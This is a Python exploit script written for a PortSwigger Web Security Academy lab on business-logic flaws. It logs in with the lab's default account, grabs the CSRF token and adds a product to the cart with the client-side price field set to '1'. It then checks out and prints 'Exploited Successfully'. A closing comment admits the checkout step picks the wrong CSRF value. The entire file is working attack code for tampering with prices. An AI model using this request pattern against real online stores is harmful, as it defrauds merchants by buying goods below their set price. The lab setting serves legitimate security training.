# Lab Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls

#!/usr/bin/python3
import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def csrf_token(s,path):
    # path = url+'/login'
    req = s.get(path,proxies=proxies,verify=False)
    soup = BeautifulSoup(req.text,"html.parser")
    for i in soup.find_all('input'):
        if i.get('name') == 'csrf':
            return i.get('value')
    # return csrf


def ordering_leather_jacket(s,url):
    login_url = url + "/login"
    csrf = csrf_token(s, login_url)
    login_data = {'csrf':csrf,'username':'wiener', 'password':'peter'}
    req = s.post(login_url,data=login_data,verify=False,proxies=proxies)
    if 'Your username is: wiener' in req.text:
        print("(+) Login Sucessfull!!")

        print("(+) Ordering item......")
        cart_path = url + '/cart'
        order_data = {'productId':'1','redir':'PRODUCT','quantity':'1','price':'1'}
        s.post(cart_path,data=order_data,allow_redirects=False,verify=False,proxies=proxies)
        
        print("(+) Checking out.....")
        csrf_cart = csrf_token(s,cart_path)
        checkout = url + '/cart/checkout'
        checkout_data = {'csrf':csrf_cart}
        check_req = s.post(checkout,data=checkout_data,verify=False,proxies=proxies)

        if 'Your order is on its way!' in check_req.text:
            print("(+) Item ordered in 0.01$")
            print("[+] Exploited Successfully!!!")
        else:
            # print('(+) Login Unsuccessful!!')
            print('[+] Exploite failed!!!!')
            sys.exit(-1)

    else:
        print('(+) Login Unsuccessful!!')
        print('[+] Exploite failed!!!!')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usages: %s <url>" %sys.argv[0])
        print("(+) Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    s = requests.session()
    print("(+) Exploiting Business logic vulnerability....")
    ordering_leather_jacket(s,url)

    # csrf_token(s,url)


if __name__=="__main__":
    main()
    

# Note
# invalid while check out, picking wrong csrf value 
